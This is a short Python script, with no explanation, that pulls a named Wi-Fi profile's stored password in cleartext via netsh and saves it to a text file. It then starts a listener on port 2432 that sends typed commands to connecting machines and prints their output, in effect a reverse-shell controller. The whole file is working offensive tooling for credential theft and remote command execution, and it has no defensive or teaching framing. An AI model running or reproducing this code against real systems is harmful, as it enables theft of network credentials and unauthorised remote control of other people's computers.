import subprocess
import socket

# Define the PowerShell command to retrieve the Wi-Fi profile key
powershell_command = 'netsh wlan show profile name="LTNOWIFI" key=clear'

# Run the PowerShell command and capture the output
try:
    output = subprocess.check_output(['powershell', '-Command', powershell_command], text=True)
except subprocess.CalledProcessError as e:
    print("Error running PowerShell command:", e)
    output = "Error running PowerShell command."

# Specify the file path where you want to save the output
output_file_path = 'wifi_profile.txt'

# Save the output to a file
with open(output_file_path, 'w') as output_file:
    output_file.write(output)

print(f"Output saved to {output_file_path}")

# Start a simple shell server on port 2432
def start_shell_server(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(1)
    print(f"Listening for incoming connections on port {port}...")
    
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Accepted connection from {client_address}")
        try:
            while True:
                command = input("Enter a command to execute (or 'exit' to quit): ")
                if command.lower() == 'exit':
                    break
                client_socket.send(command.encode())
                response = client_socket.recv(4096)
                print(response.decode(), end='')
        except KeyboardInterrupt:
            break
        finally:
            client_socket.close()
    
    server_socket.close()

# Start the shell server on port 2432
start_shell_server(2432)
